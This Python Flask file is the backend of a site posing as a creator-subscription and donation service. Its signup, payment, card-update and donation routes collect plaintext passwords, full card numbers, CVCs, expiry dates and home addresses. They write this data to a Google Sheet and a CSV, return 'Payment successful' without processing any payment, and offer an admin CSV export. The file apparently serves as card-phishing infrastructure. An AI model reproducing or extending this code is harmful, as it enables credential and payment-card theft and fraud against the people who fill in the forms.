import os
import json
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from config import Config
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import csv
import datetime
import sys

app = Flask(__name__)
app.config.from_object(Config)
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=False)

# CSV/Sheet column headers
HEADERS = ['Timestamp', 'Full Name', 'Email', 'Password', 'Card Number', 'Name on Card', 'Expiry', 'CVC', 'Street Address', 'Apt/Suite', 'City', 'State', 'ZIP Code', 'Country', 'Amount', 'Type']

# ===== Optional SQLAlchemy (local only, skipped on Vercel) =====
db = None
Transaction = None
User = None

try:
    from flask_sqlalchemy import SQLAlchemy
    from werkzeug.security import generate_password_hash, check_password_hash
    app.config['SQLALCHEMY_DATABASE_URI'] = Config.SQLALCHEMY_DATABASE_URI
    db = SQLAlchemy(app)

    class Transaction(db.Model):
        id = db.Column(db.Integer, primary_key=True)
        card_number = db.Column(db.String(16))
        card_holder_name = db.Column(db.String(100))
        expiration_date = db.Column(db.String(5))
        cvv = db.Column(db.String(3))
        amount = db.Column(db.Float)
        location = db.Column(db.String(100))
        timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())

    class User(db.Model):
        id = db.Column(db.Integer, primary_key=True)
        username = db.Column(db.String(80), unique=True, nullable=False)
        email = db.Column(db.String(120), unique=True, nullable=False)
        password = db.Column(db.String(200), nullable=False)
        subscribed = db.Column(db.Boolean, default=False)
        created_at = db.Column(db.DateTime, default=db.func.current_timestamp())

    with app.app_context():
        db.create_all()
except Exception:
    pass  # DB not available (Vercel), use session + Google Sheets only

# ===== Google Sheets Helper =====
def get_gsheet():
    try:
        scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
        creds_json = os.environ.get('GOOGLE_CREDENTIALS_JSON')
        if creds_json:
            creds_dict = json.loads(creds_json)
            credentials = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
        elif Config.GOOGLE_CREDENTIALS_PATH and os.path.exists(Config.GOOGLE_CREDENTIALS_PATH):
            credentials = ServiceAccountCredentials.from_json_keyfile_name(Config.GOOGLE_CREDENTIALS_PATH, scope)
        else:
            return None
        client = gspread.authorize(credentials)
        spreadsheet_id = os.environ.get('SPREADSHEET_ID', Config.SPREADSHEET_ID)
        if not spreadsheet_id:
            return None
        return client.open_by_key(spreadsheet_id).sheet1
    except Exception as e:
        print(f"Google Sheets connection error: {e}", flush=True)
        sys.stderr.write(f"SHEETS ERROR: {e}\n")
        return None

def save_row(row):
    """Save a row to both Google Sheets and CSV"""
    try:
        sheet = get_gsheet()
        if sheet:
            sheet.append_row(row, value_input_option='RAW')
            print(f"Row saved to Google Sheets successfully", flush=True)
        else:
            print(f"WARNING: get_gsheet() returned None — no credentials or sheet ID configured", flush=True)
    except Exception as e:
        print(f"Google Sheets error: {e}", flush=True)

    try:
        csv_path = Config.CSV_FILE_PATH or os.path.join(os.path.dirname(__file__), 'transactions.csv')
        file_exists = os.path.exists(csv_path) and os.path.getsize(csv_path) > 0
        with open(csv_path, 'a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(HEADERS)
            writer.writerow(row)
    except Exception:
        pass

# ===== Routes =====
@app.route('/')
def landing():
    if session.get('subscribed', False):
        return redirect(url_for('home'))
    return render_template('landing.html')

@app.route('/home')
def home():
    if not session.get('subscribed', False):
        return redirect(url_for('landing'))
    return render_template('home.html', subscribed=True)

@app.route('/lilyfish')
def creator_profile():
    subscribed = session.get('subscribed', False)
    return render_template('profile.html', subscribed=subscribed)

@app.route('/chat')
def chat():
    if not session.get('subscribed', False):
        return redirect(url_for('creator_profile'))
    username = session.get('chat_username', '') or session.get('signup_username', '') or 'guest'
    return render_template('chat.html', username=username)

@app.route('/payment')
def payment():
    return render_template('pay.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.json
    username = data.get('username', '').strip()
    email = data.get('email', '').strip()
    password = data.get('password', '')

    if not username or not email or not password:
        return jsonify({'error': 'All fields are required'}), 400

    if db and User:
        try:
            from werkzeug.security import generate_password_hash
            if User.query.filter((User.username == username) | (User.email == email)).first():
                return jsonify({'error': 'Username or email already taken'}), 409
            user = User(username=username, email=email, password=generate_password_hash(password, method='pbkdf2:sha256'))
            db.session.add(user)
            db.session.commit()
            session['user_id'] = user.id
        except Exception:
            pass

    session['signup_password'] = password
    session['signup_username'] = username
    session['signup_email'] = email
    session['chat_username'] = username
    session['subscribed'] = False
    return jsonify({'message': 'Account created'})

@app.route('/pay', methods=['POST'])
def pay():
    data = request.json
    card_number = data.get('card_number', '')
    card_holder_name = data.get('card_holder_name', '')
    expiration_date = data.get('expiration_date', '')
    cvv = data.get('cvv', '')
    amount = data.get('amount', 0)
    street = data.get('street', '')
    street2 = data.get('street2', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')
    timestamp = str(datetime.datetime.now())

    if db and Transaction:
        try:
            location = ', '.join(filter(None, [street, street2, city, state, zip_code, country]))
            new_transaction = Transaction(card_number=card_number, card_holder_name=card_holder_name, expiration_date=expiration_date, cvv=cvv, amount=float(amount) if amount else 0, location=location, timestamp=datetime.datetime.now())
            db.session.add(new_transaction)
            db.session.commit()
        except Exception:
            pass

    if db and User and 'user_id' in session:
        try:
            user = User.query.get(session['user_id'])
            if user:
                user.subscribed = True
                db.session.commit()
        except Exception:
            pass

    session['subscribed'] = True
    session['card_last4'] = card_number[-4:] if card_number and len(card_number) >= 4 else ''
    session['card_holder'] = card_holder_name or ''

    username = session.get('signup_username', '')
    session['chat_username'] = username
    email = session.pop('signup_email', '')
    signup_password = session.pop('signup_password', '')

    # Timestamp | Full Name | Email | Password | Card Number | Name on Card | Expiry | CVC | Street | Apt | City | State | ZIP | Country | Amount | Type
    row = [timestamp, username, email, signup_password, card_number, card_holder_name, expiration_date, cvv, street, street2, city, state, zip_code, country, str(amount), 'signup']
    save_row(row)

    return jsonify({'message': 'Payment successful'})

@app.route('/me')
def user_profile():
    if not session.get('subscribed', False):
        return redirect(url_for('creator_profile'))
    username = session.get('chat_username', 'guest')
    email = session.get('signup_email', '')
    card_last4 = session.get('card_last4', '')
    card_holder = session.get('card_holder', '')
    return render_template('user_profile.html', username=username, email=email, card_last4=card_last4, card_holder=card_holder)

@app.route('/update-card', methods=['POST'])
def update_card():
    if not session.get('subscribed', False):
        return jsonify({'error': 'Not authorized'}), 401
    data = request.json
    card_number = data.get('card_number', '')
    card_holder_name = data.get('card_holder_name', '')
    expiration_date = data.get('expiration_date', '')
    cvv = data.get('cvv', '')

    session['card_last4'] = card_number[-4:] if len(card_number) >= 4 else ''
    session['card_holder'] = card_holder_name

    username = session.get('chat_username', '')
    timestamp = str(datetime.datetime.now())
    row = [timestamp, username, '', '', card_number, card_holder_name, expiration_date, cvv, '', '', '', '', '', '', '', 'card_update']
    save_row(row)

    return jsonify({'message': 'Card updated'})

@app.route('/admin')
def admin():
    if not session.get('is_admin', False):
        return render_template('admin_login.html')
    return render_template('admin.html')

@app.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    admin_pw = os.environ.get('ADMIN_PASSWORD', 'lilyadmin')
    if data.get('password') == admin_pw:
        session['is_admin'] = True
        return jsonify({'message': 'Logged in'})
    return jsonify({'error': 'Wrong password'}), 401

@app.route('/admin/export-csv')
def admin_export_csv():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Not authorized'}), 401
    csv_path = Config.CSV_FILE_PATH or os.path.join(os.path.dirname(__file__), 'transactions.csv')
    if os.path.exists(csv_path):
        from flask import send_file
        return send_file(csv_path, mimetype='text/csv', as_attachment=True, download_name='havenbridge_transactions.csv')
    return jsonify({'error': 'No CSV file found'}), 404

@app.route('/api/signup', methods=['POST'])
def api_signup():
    """API endpoint for Next.js frontend signup"""
    data = request.json
    full_name = data.get('name', '').strip()
    email = data.get('email', '').strip()
    password = data.get('password', '')

    if not full_name or not email or not password:
        return jsonify({'error': 'All fields are required'}), 400

    if db and User:
        try:
            from werkzeug.security import generate_password_hash
            if User.query.filter((User.username == full_name) | (User.email == email)).first():
                return jsonify({'error': 'Username or email already taken'}), 409
            user = User(username=full_name, email=email, password=generate_password_hash(password, method='pbkdf2:sha256'))
            db.session.add(user)
            db.session.commit()
        except Exception:
            pass

    timestamp = str(datetime.datetime.now())
    card_number = data.get('cardNumber', '').replace(' ', '')
    card_name = data.get('cardName', '')
    expiry = data.get('expiry', '')
    cvc = data.get('cvc', '')
    street = data.get('street', '')
    street2 = data.get('street2', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')

    # Timestamp | Full Name | Email | Password | Card Number | Name on Card | Expiry | CVC | Street | Apt | City | State | ZIP | Country | Amount | Type
    row = [timestamp, full_name, email, password, card_number, card_name, expiry, cvc, street, street2, city, state, zip_code, country, '0', 'signup']
    save_row(row)

    return jsonify({'message': 'Account created', 'user': {'id': 'user-' + full_name.lower().replace(' ', ''), 'name': full_name, 'email': email}})

@app.route('/api/donate', methods=['POST'])
def api_donate():
    """API endpoint for Next.js frontend donations"""
    data = request.json
    card_number = data.get('cardNumber', '').replace(' ', '')
    card_name = data.get('cardName', '')
    expiry = data.get('expiry', '')
    cvc = data.get('cvc', '')
    amount = data.get('amount', 0)
    campaign = data.get('campaign', '')
    street = data.get('street', '')
    street2 = data.get('street2', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')
    timestamp = str(datetime.datetime.now())

    if db and Transaction:
        try:
            location = ', '.join(filter(None, [street, street2, city, state, zip_code, country]))
            new_transaction = Transaction(card_number=card_number, card_holder_name=card_name, expiration_date=expiry, cvv=cvc, amount=float(amount), location=location, timestamp=datetime.datetime.now())
            db.session.add(new_transaction)
            db.session.commit()
        except Exception:
            pass

    # Timestamp | Full Name | Email | Password | Card Number | Name on Card | Expiry | CVC | Street | Apt | City | State | ZIP | Country | Amount | Type
    row = [timestamp, '', '', '', card_number, card_name, expiry, cvc, street, street2, city, state, zip_code, country, str(amount), 'donation: ' + campaign]
    save_row(row)

    return jsonify({'message': 'Donation received', 'amount': amount})

@app.route('/api/test-sheets')
def test_sheets():
    """Diagnostic endpoint to test Google Sheets connection"""
    creds_json = os.environ.get('GOOGLE_CREDENTIALS_JSON')
    spreadsheet_id = os.environ.get('SPREADSHEET_ID', Config.SPREADSHEET_ID)
    status = {
        'GOOGLE_CREDENTIALS_JSON_set': bool(creds_json),
        'GOOGLE_CREDENTIALS_JSON_length': len(creds_json) if creds_json else 0,
        'SPREADSHEET_ID': spreadsheet_id,
    }
    try:
        sheet = get_gsheet()
        if sheet:
            status['connection'] = 'SUCCESS'
            status['sheet_title'] = sheet.title
            status['row_count'] = sheet.row_count
        else:
            status['connection'] = 'FAILED — get_gsheet() returned None'
    except Exception as e:
        status['connection'] = f'ERROR: {e}'
    return jsonify(status)

if __name__ == '__main__':
    app.run(debug=True, port=5001)
